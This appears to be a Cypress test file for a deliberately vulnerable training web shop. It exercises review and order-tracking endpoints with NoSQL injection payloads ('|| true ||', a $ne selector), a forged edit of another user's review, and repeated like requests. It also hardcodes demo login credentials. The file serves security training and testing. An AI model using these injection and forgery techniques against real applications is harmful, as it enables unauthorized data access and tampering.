describe('/rest/products/reviews', () => {
  beforeEach(() => {
    cy.visit('/#/search')
  })

  describe('challenge "NoSQL Exfiltration"', () => {
    it('should not be possible to inject and get all the orders', () => {
      cy.request(`${Cypress.config('baseUrl')}/rest/track-order/%27%20%7C%7C%20true%20%7C%7C%20%27`).then((response) => {
        expect(response.body.data).to.have.length(1)
        expect(response.body.data[0].email).to.equal(undefined)
      })
    })
  })

  describe('challenge "NoSQL Manipulation"', () => {
    beforeEach(() => {
      cy.login({ email: 'admin', password: 'admin123' })
    })

    it('should not be possible to inject a selector into the update route', () => {
      cy.window().then((win) => {
        cy.request({
          method: 'PATCH',
          url: '/rest/products/reviews',
          headers: { Authorization: `Bearer ${win.localStorage.getItem('token')}` },
          body: {
            id: { $ne: -1 },
            message: 'NoSQL Injection!'
          }
        }).then((response) => {
          expect(response.body.modified).to.equal(0)
        })
      })
    })
  })

  describe('challenge "Forged Review"', () => {
    beforeEach(() => {
      cy.login({ email: 'mc.safesearch', password: 'Mr. N00dles' })
    })

    it('should be possible to edit any existing review', () => {
      cy.visit('/')
      cy.window().then(async () => {
        const response = await fetch(
          `${Cypress.config('baseUrl')}/rest/products/1/reviews`,
          {
            method: 'GET',
            headers: {
              'Content-type': 'text/plain'
            }
          }
        )
        if (response.status === 200) {
          const responseJson = await response.json()
          const reviewId = responseJson.data[0]._id
          await editReview(reviewId)
        }

        async function editReview (reviewId: string) {
          const response = await fetch(
            `${Cypress.config('baseUrl')}/rest/products/reviews`,
            {
              method: 'PATCH',
              headers: {
                'Content-type': 'application/json',
                Authorization: `Bearer ${localStorage.getItem('token')}`
              },
              body: JSON.stringify({ id: reviewId, message: 'injected' })
            }
          )
          if (response.status === 200) {
            console.log('Success')
          }
        }
      })
      cy.expectChallengeSolved({ challenge: 'Forged Review' })
    })
  })

  describe('challenge "Multiple Likes"', () => {
    beforeEach(() => {
      cy.login({ email: 'mc.safesearch', password: 'Mr. N00dles' })
    })

    it('should be possible to like reviews multiple times', () => {
      cy.visit('/')
      cy.window().then(async () => {
        async function sendPostRequest (reviewId: string) {
          const anotherResponse = await fetch(
            `${Cypress.config('baseUrl')}/rest/products/reviews`,
            {
              method: 'POST',
              headers: {
                'Content-type': 'application/json',
                Authorization: `Bearer ${localStorage.getItem('token')}`
              },
              body: JSON.stringify({ id: reviewId })
            }
          )
          if (anotherResponse.status === 200) {
            console.log('Success')
          }
        }

        const response = await fetch(
          `${Cypress.config('baseUrl')}/rest/products/1/reviews`,
          {
            method: 'GET',
            headers: {
              'Content-type': 'text/plain'
            }
          }
        )
        if (response.status === 200) {
          const responseJson = await response.json()
          const reviewId = responseJson.data[0]._id

          void sendPostRequest(reviewId)
          void sendPostRequest(reviewId)
          void sendPostRequest(reviewId)
        }
      })
      cy.expectChallengeSolved({ challenge: 'Multiple Likes' })
    })
  })
})
